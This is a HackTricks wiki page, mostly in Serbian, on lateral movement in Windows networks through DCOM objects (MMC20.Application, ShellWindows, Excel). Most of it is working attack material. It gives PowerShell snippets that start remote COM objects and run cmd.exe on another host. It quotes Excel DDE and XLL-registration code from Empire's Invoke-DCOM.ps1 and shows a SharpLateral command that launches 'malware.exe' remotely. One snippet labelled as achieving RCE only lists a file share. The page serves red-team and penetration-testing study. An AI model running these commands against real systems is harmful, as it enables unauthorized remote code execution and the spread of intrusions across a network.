# DCOM Exec

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## MMC20.Application

**Za više informacija o ovoj tehnici pogledajte originalni post sa [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Distributed Component Object Model (DCOM) objekti predstavljaju zanimljivu mogućnost za interakciju sa objektima putem mreže. Microsoft pruža sveobuhvatnu dokumentaciju za DCOM i Component Object Model (COM), dostupnu [ovde za DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) i [ovde za COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Lista DCOM aplikacija može se dobiti korišćenjem PowerShell komande:
```bash
Get-CimInstance Win32_DCOMApplication
```
The COM objekat, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), omogućava skriptovanje operacija MMC dodataka. Značajno, ovaj objekat sadrži `ExecuteShellCommand` metodu pod `Document.ActiveView`. Više informacija o ovoj metodi može se naći [ovde](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Proverite kako radi:

Ova funkcija olakšava izvršavanje komandi preko mreže putem DCOM aplikacije. Da biste se povezali sa DCOM-om na daljinu kao administrator, PowerShell se može koristiti na sledeći način:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Ova komanda se povezuje na DCOM aplikaciju i vraća instancu COM objekta. Zatim se može pozvati metoda ExecuteShellCommand da bi se izvršio proces na udaljenom hostu. Proces uključuje sledeće korake:

Check methods:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Dobijte RCE:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Za više informacija o ovoj tehnici pogledajte originalni post [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Objekat **MMC20.Application** je identifikovan kao onaj koji nema eksplicitne "LaunchPermissions," podrazumevajući dozvole koje omogućavaju pristup Administratorima. Za dodatne detalje, može se istražiti tema [ovde](https://twitter.com/tiraniddo/status/817532039771525120), a preporučuje se korišćenje [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET za filtriranje objekata bez eksplicitne dozvole za pokretanje.

Dva specifična objekta, `ShellBrowserWindow` i `ShellWindows`, su istaknuta zbog nedostatka eksplicitnih dozvola za pokretanje. Odsustvo `LaunchPermission` registracione stavke pod `HKCR:\AppID\{guid}` označava da nema eksplicitnih dozvola.

###  ShellWindows
Za `ShellWindows`, koji nema ProgID, .NET metode `Type.GetTypeFromCLSID` i `Activator.CreateInstance` olakšavaju instanciranje objekta koristeći njegov AppID. Ovaj proces koristi OleView .NET za preuzimanje CLSID-a za `ShellWindows`. Kada je instanciran, interakcija je moguća putem metode `WindowsShell.Item`, što dovodi do poziva metoda kao što je `Document.Application.ShellExecute`.

Primeri PowerShell komandi su dati za instanciranje objekta i izvršavanje komandi na daljinu:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Lateral Movement with Excel DCOM Objects

Lateral movement može se postići iskorišćavanjem DCOM Excel objekata. Za detaljne informacije, preporučuje se da pročitate diskusiju o korišćenju Excel DDE za lateralno kretanje putem DCOM na [Cybereasonovom blogu](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Empire projekat pruža PowerShell skriptu, koja demonstrira korišćenje Excela za daljinsko izvršavanje koda (RCE) manipulacijom DCOM objekata. Ispod su isječci iz skripte dostupne na [Empire-ovom GitHub repozitorijumu](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), koji prikazuju različite metode zloupotrebe Excela za RCE:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Automation Tools for Lateral Movement

Dva alata su istaknuta za automatizaciju ovih tehnika:

- **Invoke-DCOM.ps1**: PowerShell skripta koju pruža Empire projekat koja pojednostavljuje pozivanje različitih metoda za izvršavanje koda na udaljenim mašinama. Ova skripta je dostupna na Empire GitHub repozitorijumu.

- **SharpLateral**: Alat dizajniran za izvršavanje koda na daljinu, koji se može koristiti sa komandom:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Automatic Tools

* Powershell skripta [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) omogućava lako pozivanje svih komentisanih načina za izvršavanje koda na drugim mašinama.
* Takođe možete koristiti [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Reference

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podrška HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
